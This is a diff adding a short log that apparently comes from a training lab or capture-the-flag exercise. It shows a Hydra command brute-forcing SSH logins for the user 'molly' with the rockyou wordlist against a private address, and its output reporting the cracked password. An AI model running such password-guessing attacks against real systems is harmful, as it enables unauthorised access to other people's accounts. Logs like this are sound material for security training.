@@ -1,0 +1,10 @@
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.34.149 -t 4 ssh
+
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-25 11:37:13
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.10.34.149:22/
+[22][ssh] host: 10.10.34.149   login: molly   password: butterfly
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-25 12:03:07
